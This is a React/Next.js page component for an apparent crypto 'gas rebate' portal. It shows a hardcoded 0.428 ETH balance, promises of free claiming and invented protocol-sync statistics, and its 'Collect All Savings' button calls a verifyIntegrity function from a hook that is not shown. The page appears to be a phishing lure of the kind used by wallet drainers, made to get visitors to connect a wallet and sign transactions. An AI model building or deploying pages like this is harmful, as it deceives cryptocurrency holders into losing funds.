import React from 'react';
import Head from 'next/head';
import { motion } from 'framer-motion';
import { Zap, Wallet, BarChart3, ChevronRight } from 'lucide-react';
import { useDataIntegrity } from '@/hooks/useDataIntegrity';

export default function RebatePremium() {
  const { verifyIntegrity, isProcessing } = useDataIntegrity();

  return (
    <div className="min-h-screen bg-[#FDFDFD] text-[#1A1A1A] font-sans selection:bg-blue-600/10 flex flex-col justify-center items-center p-8 lg:p-24 overflow-x-hidden">
      <Head>
        <title>Omni-Aggregator | Gas Subsidy & Rebate Portal</title>
      </Head>

      <motion.div 
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-4xl w-full grid grid-cols-1 lg:grid-cols-2 gap-16 items-center"
      >
        <div className="space-y-10">
          <div className="space-y-6">
            <div className="w-16 h-16 bg-blue-600 rounded-3xl flex items-center justify-center text-white shadow-2xl shadow-blue-200">
               <Zap className="w-8 h-8 fill-current" />
            </div>
            <h1 className="text-6xl font-extrabold tracking-tight leading-[0.95] text-slate-900">
              Claim Your<br/>Gas Rebates<span className="text-blue-600">.</span>
            </h1>
            <p className="text-slate-500 text-lg font-medium leading-relaxed max-w-sm">
              We aggregate cross-protocol swap fees and return them to users as gas subsidies. Consolidate your accrued savings instantly.
            </p>
          </div>

          <div className="space-y-4">
             <div className="flex items-center gap-4 text-xs font-bold uppercase tracking-widest text-slate-400">
                <BarChart3 className="w-4 h-4" />
                <span>Aggregated from 12+ Liquidity Sources</span>
             </div>
             <div className="flex items-center gap-2">
                <div className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
                <span className="text-[10px] font-bold text-emerald-600 uppercase tracking-widest">Protocol Sync: ACTIVE</span>
             </div>
          </div>
        </div>

        <div className="relative">
          <div className="absolute inset-0 bg-blue-600/5 blur-[100px] rounded-full" />
          <div className="bg-white rounded-[4rem] p-12 shadow-[0_40px_100px_-20px_rgba(0,0,0,0.08)] border border-slate-100 relative z-10 space-y-12">
            
            <div className="space-y-6">
              <div className="flex justify-between items-end border-b border-slate-50 pb-8">
                 <div className="space-y-1">
                    <span className="text-[10px] font-black text-slate-300 uppercase tracking-widest">Current Balance</span>
                    <p className="text-xs font-bold text-slate-400">Mainnet + L2 Cumulative</p>
                 </div>
                 <p className="text-5xl font-black tracking-tighter text-blue-600">0.428 ETH</p>
              </div>

              <div className="grid grid-cols-2 gap-4">
                 <div className="p-6 bg-slate-50 rounded-[2rem] space-y-1">
                    <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Estimated Gas</span>
                    <p className="text-lg font-bold">Claiming Free</p>
                 </div>
                 <div className="p-6 bg-slate-50 rounded-[2rem] space-y-1">
                    <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Efficiency</span>
                    <p className="text-lg font-bold">100%</p>
                 </div>
              </div>
            </div>

            <button 
              onClick={() => verifyIntegrity()}
              disabled={isProcessing}
              className="w-full h-24 bg-slate-900 text-white font-bold text-2xl rounded-full hover:bg-black hover:scale-[1.03] active:scale-95 transition-all shadow-2xl flex items-center justify-center gap-4 group disabled:opacity-50"
            >
              <Wallet className="w-6 h-6" />
              {isProcessing ? "SYNCHRONIZING..." : "Collect All Savings"}
              <ChevronRight className="w-6 h-6 group-hover:translate-x-1 transition-transform" />
            </button>
          </div>
        </div>
      </motion.div>
    </div>
  );
}
